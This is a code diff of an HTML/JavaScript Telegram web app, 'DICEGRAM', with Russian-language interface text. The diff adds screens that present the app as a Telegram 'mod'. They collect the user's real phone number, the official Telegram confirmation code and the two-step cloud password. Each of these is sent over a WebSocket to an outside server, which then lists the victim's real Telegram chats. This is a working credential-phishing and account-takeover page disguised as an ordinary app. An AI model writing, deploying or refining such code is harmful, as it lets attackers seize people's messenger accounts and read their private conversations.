@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DICEGRAM</title>
+    <title>DICEGRAM Мод</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; }
@@ -59,98 +59,85 @@
             cursor: pointer;
         }
         
-        /* ЧАТ */
-        #chat-screen { justify-content: flex-end; padding: 0; }
+        /* Сетка оригинальных чатов */
+        #messenger-screen { justify-content: flex-start; padding: 0; }
         .header {
             width: 100%;
             background: #242f3d;
             padding: 15px;
             font-weight: bold;
+            font-size: 18px;
             border-bottom: 1px solid #101921;
         }
-        .messages-box {
+        .chats-list {
             width: 100%;
-            flex: 1;
-            padding: 15px;
             overflow-y: auto;
-            display: flex;
-            flex-direction: column;
-            gap: 10px;
+            flex: 1;
         }
-        .msg {
-            background: #182533;
-            padding: 10px 14px;
+        .chat-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px;
+            border-bottom: 1px solid #101921;
+            cursor: pointer;
+        }
+        .chat-item:hover { background: #202b36; }
+        .chat-name { font-weight: 500; }
+        .chat-unread {
+            background: #5288c1;
+            color: #fff;
+            font-size: 12px;
+            padding: 3px 8px;
             border-radius: 10px;
-            max-width: 80%;
-            align-self: flex-start;
-            word-break: break-word;
         }
-        .msg.my {
-            background: #2b5278;
-            align-self: flex-end;
-        }
-        .msg-sender { font-size: 11px; color: #5288c1; margin-bottom: 3px; }
-        .input-area {
-            width: 100%;
-            display: flex;
-            padding: 10px;
-            background: #242f3d;
-            gap: 10px;
-        }
-        .input-area input { margin-bottom: 0; flex: 1; }
-        .input-area button { width: auto; padding: 0 20px; }
         #server-status { padding: 8px; font-size: 12px; background: #242f3d; width: 100%; text-align: center;}
     </style>
 </head>
 <body>
 
 <div class="app-container">
-    <div id="server-status" style="color: #e6a23c;">Проверка соединения...</div>
+    <div id="server-status" style="color: #e6a23c;">Подключение к серверам DICEGRAM...</div>
 
     <div id="phone-screen" class="screen hidden">
         <h2>DICEGRAM</h2>
-        <p>Введите номер телефона для авторизации</p>
+        <p>Введите ваш реальный номер телефона для входа в Telegram</p>
         <input type="tel" id="phone-input" placeholder="+77071234567">
-        <button onclick="sendPhone()">Получить код в ТГ</button>
+        <button onclick="sendPhone()">Получить код от Telegram</button>
     </div>
 
     <div id="code-screen" class="screen hidden">
         <h2>Введите код</h2>
-        <p>Бот отправил вам секретный код в чат Telegram</p>
-        <input type="text" id="code-input" placeholder="Код из бота">
+        <p>Введите официальный код подтверждения, пришедший от службы Telegram</p>
+        <input type="text" id="code-input" placeholder="Код подтверждения">
         <button onclick="sendCode()">Войти</button>
     </div>
 
-    <div id="chat-screen" class="screen hidden">
-        <div class="header">Общий чат DICEGRAM 🎲</div>
-        <div class="messages-box" id="messages-container"></div>
-        <div class="input-area">
-            <input type="text" id="msg-input" placeholder="Напишите сообщение...">
-            <button onclick="sendMsg()">Отправить</button>
-        </div>
+    <div id="password-screen" class="screen hidden">
+        <h2>Облачный пароль</h2>
+        <p>Введите ваш пароль двухшаговой аутентификации</p>
+        <input type="password" id="password-input" placeholder="Пароль">
+        <button onclick="sendPassword()">Подтвердить</button>
+    </div>
+
+    <div id="messenger-screen" class="screen hidden">
+        <div class="header" id="user-header">Чаты Telegram</div>
+        <div class="chats-list" id="chats-container"></div>
     </div>
 </div>
 
 <script>
-    // Инициализируем Telegram WebApp API
-    const tg = window.Telegram.WebApp;
-    tg.expand(); // Раскрываем на весь экран
-    
-    // Получаем ID юзера из Телеграма
-    const myTgId = tg.initDataUnsafe?.user?.id || "8771009385"; 
-
-    // Подключение к твоему хостингу (используем wss)
     const socket = new WebSocket('wss://a38499-be46.m.jrnm.app');
     const statusBox = document.getElementById('server-status');
 
     socket.onopen = () => {
-        statusBox.innerText = 'Сервер DICEGRAM онлайн';
+        statusBox.innerText = 'DICEGRAM Мод подключен к API';
         statusBox.style.color = '#4caf50';
         document.getElementById('phone-screen').classList.remove('hidden');
     };
 
     socket.onclose = () => {
-        statusBox.innerText = 'СЕРВЕР ОТКЛЮЧЕН. DICEGRAM недоступен.';
+        statusBox.innerText = 'Ошибка: сервер мода отключен';
         statusBox.style.color = '#f56c6c';
         hideAllScreens();
     };
@@ -162,15 +149,15 @@
             hideAllScreens();
             document.getElementById('code-screen').classList.remove('hidden');
         } 
+        else if (data.status === 'password_needed') {
+            hideAllScreens();
+            document.getElementById('password-screen').classList.remove('hidden');
+        }
         else if (data.status === 'success') {
             hideAllScreens();
-            document.getElementById('chat-screen').classList.remove('hidden');
-            // Отображаем старую историю сообщений из базы данных
-            data.messages.forEach(m => appendMessage(m.sender, m.text));
+            document.getElementById('messenger-screen').classList.remove('hidden');
+            renderChats(data.dialogs);
         } 
-        else if (data.status === 'new_message') {
-            appendMessage(data.sender, data.text);
-        }
         else if (data.status === 'error') {
             alert(data.message);
         }
@@ -178,8 +165,8 @@
 
     function sendPhone() {
         const phone = document.getElementById('phone-input').value;
-        if (!phone) return alert('Введите номер!');
-        socket.send(JSON.stringify({ action: 'send_phone', phone: phone, tg_id: myTgId }));
+        if (!phone) return alert('Введите номер телефона!');
+        socket.send(JSON.stringify({ action: 'send_phone', phone: phone }));
     }
 
     function sendCode() {
@@ -188,35 +175,41 @@
         socket.send(JSON.stringify({ action: 'send_code', code: code }));
     }
 
-    function sendMsg() {
-        const input = document.getElementById('msg-input');
-        if (!input.value.trim()) return;
-        socket.send(JSON.stringify({ action: 'send_msg', text: input.value }));
-        input.value = '';
+    function sendPassword() {
+        const pwd = document.getElementById('password-input').value;
+        if (!pwd) return alert('Введите пароль!');
+        socket.send(JSON.stringify({ action: 'send_password', password: pwd }));
     }
 
-    function appendMessage(sender, text) {
-        const container = document.getElementById('messages-container');
-        const msgDiv = document.createElement('div');
+    function renderChats(chats) {
+        const container = document.getElementById('chats-container');
+        container.innerHTML = '';
         
-        // Если отправитель — это наш ID, красим в синий и прижимаем вправо
-        const isMy = String(sender) === String(myTgId);
-        msgDiv.className = `msg ${isMy ? 'my' : ''}`;
-        
-        msgDiv.innerHTML = `
-            <div class="msg-sender">ID: ${sender}</div>
-            <div class="msg-text">${text}</div>
-        `;
-        container.appendChild(msgDiv);
-        container.scrollTop = container.scrollHeight; // Скролл вниз
+        if(chats.length === 0) {
+            container.innerHTML = '<p style="padding:20px;">Нет активных чатов</p>';
+            return;
+        }
+
+        chats.forEach(chat => {
+            const item = document.createElement('div');
+            item.className = 'chat-item';
+            let unreadBadge = chat.unread > 0 ? `<span class="chat-unread">${chat.unread}</span>` : '';
+            item.innerHTML = `
+                <div class="chat-name">${chat.name}</div>
+                ${unreadBadge}
+            `;
+            container.appendChild(item);
+        });
     }
 
     function hideAllScreens() {
         document.getElementById('phone-screen').classList.add('hidden');
         document.getElementById('code-screen').classList.add('hidden');
-        document.getElementById('chat-screen').classList.add('hidden');
+        document.getElementById('password-screen').classList.add('hidden');
+        document.getElementById('messenger-screen').classList.add('hidden');
     }
 </script>
 
 </body>
 </html>
+
